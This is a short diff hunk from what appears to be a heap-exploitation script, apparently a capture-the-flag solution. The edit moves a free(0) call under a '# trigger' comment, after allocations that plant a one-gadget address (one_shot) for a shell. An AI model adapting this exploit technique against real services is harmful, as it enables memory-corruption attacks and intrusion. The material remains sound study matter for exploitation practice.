@@ -186,9 +186,9 @@ def exploit(r):
     allocate(0x68, "F")
     allocate(0x68, "G")
     allocate(0x68,"H"*0x13+p64(one_shot))
-    free(0)
    
     # trigger
+    free(0)
     r.sendline("3")
     r.sendline("0") 
     
